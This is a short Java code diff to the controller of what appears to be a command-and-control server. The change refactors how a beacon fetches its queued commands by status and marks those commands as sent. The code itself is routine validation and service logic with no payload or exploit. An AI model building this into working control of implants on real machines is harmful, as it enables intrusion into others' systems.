@@ -1,5 +1,6 @@
 package com.reffians.c2.controller;
 
+import com.reffians.c2.model.Command;
 import com.reffians.c2.model.Command.Status;
 import com.reffians.c2.model.User;
 import com.reffians.c2.service.C2Service;
@@ -45,22 +46,22 @@ public class C2Controller {
       @RequestParam Optional<String> status) {
     logger.info("GET commands from beacon with beaconid: {}, status: {}",
         beaconid, status.orElse("NULL"));
-
     if (beaconid < 0) {
       logger.info("GET commands from beacon with negative beaconid: {}", beaconid);
       return responseBadRequest("Invalid beaconid: supplied beaconid is negative.");
     }
-
-    if (!status.isPresent()) {
-      return responseOk(c2Service.getCommands(beaconid));
-    }
-
-    if (!Status.isValid(status.get())) {
+    if (status.isPresent() && !Status.isValid(status.get())) {
       logger.info("GET commands from beacon with invalid status: {}", status);
       return responseBadRequest("Invalid status.");
     }
-
-    return responseOk(c2Service.getCommands(beaconid, Status.valueOf(status.get())));
+    List<Command> commands;
+    if (status.isPresent()) {
+      commands = c2Service.getCommands(beaconid, Status.valueOf(status.get()));
+    } else {
+      commands = c2Service.getCommands(beaconid);
+    }
+    c2Service.updateCommandStatus(commands, Status.sent);
+    return responseOk(commands);
   }
 
 
